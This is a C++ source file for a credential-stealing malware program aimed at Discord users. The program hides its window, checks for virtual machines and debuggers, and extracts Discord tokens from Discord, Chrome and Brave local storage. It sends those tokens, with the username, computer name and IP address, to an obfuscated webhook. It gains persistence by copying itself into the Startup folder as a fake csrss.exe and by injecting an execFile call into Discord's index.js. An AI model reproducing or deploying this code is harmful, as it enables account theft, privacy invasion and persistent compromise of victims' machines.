#define _CRT_SECURE_NO_WARNINGS
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
#include "includes.h"

#define WEBHOOK AY_OBFUSCATE("webhook")
#define VERSION "BETA 1.0"

namespace fs = std::filesystem;

void webhookSend(const std::string& text) {
	cpr::Response r = cpr::Post(cpr::Url{ WEBHOOK },
		cpr::Payload{ {"content", text} });
}

void MainRoutine() {
	while (!InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0))
		Sleep(1000); /* Sleep whilst not connected to internet */

	const char* LIGHTCORD = AY_OBFUSCATE("\\Lightcord\\Local Storage\\leveldb");
	const char* DISCORD = AY_OBFUSCATE("\\Discord\\Local Storage\\leveldb");
	const char* DISCORDPTB = AY_OBFUSCATE("\\discordptb\\Local Storage\\leveldb");
	const char* DISCORDCANARY = AY_OBFUSCATE("\\discordcanary\\Local Storage\\leveldb");
	const char* CHROME = AY_OBFUSCATE("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
	const char* BRAVE = AY_OBFUSCATE("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

	std::vector<std::string> installs = { LIGHTCORD, DISCORD,
		DISCORDPTB, DISCORDCANARY,
		CHROME, BRAVE };

	try {
		for (uint32_t i = 0; i < installs.size(); i++) {
			std::string ip = cpr::Get(cpr::Url{ "https://api.ipify.org/?format=text" }).text;

			std::string path = std::getenv("appdata") + installs[i];
			if (i > 3)
				path = std::getenv("localappdata") + installs[i];
			if (!pathExists(path)) continue;

			for (const fs::directory_entry& entry : fs::directory_iterator(path)) {
				std::ifstream file_path(entry.path(), std::ios_base::binary);

				std::string str((std::istreambuf_iterator<char>(file_path)), std::istreambuf_iterator<char>());
				std::vector<std::string> matches;
				std::regex expression(AY_OBFUSCATE(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
				std::regex expression2(AY_OBFUSCATE(R"(mfa\.[\w-]{84})"));

				std::vector<std::string> regex_non_mfa = findMatch(str, expression);
				std::vector<std::string> regex_mfa = findMatch(str, expression2);

				for (uint32_t i = 0; i < regex_non_mfa.size(); i++)
					matches.push_back(regex_non_mfa[i]);

				for (uint32_t i = 0; i < regex_mfa.size(); i++)
					matches.push_back(regex_mfa[i]);

				for (uint32_t i = 0; i < matches.size(); i++) {
					if (checkToken(matches[i])) {
						User::Discord token;
						token.init(matches[i]);
						auto token_info = token.get_token_info();
						token_info.append("Working Directory: " + path);

						std::stringstream pc_s;

						pc_s << "```" << "\r\n" \
							<< "Username: " << std::getenv("username") << "\r\n" \
							<< "Computer Name: " << std::getenv("computername") << "\r\n" \
							<< "Internet Address: " << ip << "\r\n" \
							<< "```";


						std::string pc_info = pc_s.str();
						token_info.append(pc_info);
						webhookSend(token_info);
					}
				}
			}
		}
	}

	catch (const std::exception& e)
	{
		//std::cout << "Exception thrown: " << e.what() << "\n";
		//return;
		exit(EXIT_FAILURE);
	}
}

void InfectRoutine() {
	char BUFFER[MAX_PATH], szPath[MAX_PATH], discordPath[MAX_PATH];
	char altPath[MAX_PATH] = "C:\\Windows\\Temp\\csrss.exe";

	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
	webhookSend(BUFFER);

	sprintf(szPath, AY_OBFUSCATE("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\csrss.exe"));
	fs::remove(szPath);
	fs::copy(BUFFER, szPath);
	fs::copy(BUFFER, altPath);

	sprintf(discordPath, AY_OBFUSCATE("%s\\Discord\\modules\\discord_desktop_core"), std::getenv("appdata"));
	if (!pathExists(discordPath))
		return;

	sprintf(szPath, "%s\\index.js", discordPath);
	std::ofstream index(szPath);
	index << "module.exports = require('./core.asar');" << std::endl \
		  << "var exec = require('child_process').execFile; exec('" \
		  << altPath \
		  << "'); // Important Discord Assets.";
}

int main(int argc, char* argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	Anti anti(Config::check_virtual_machine, Config::check_debugging, Config::check_analyzing, Config::watch_dog);

	std::thread mr(MainRoutine); /* Find discord tokens and get PC information */
	std::thread ir(InfectRoutine); /* Infect the computer, add persistence */
	mr.join();
}
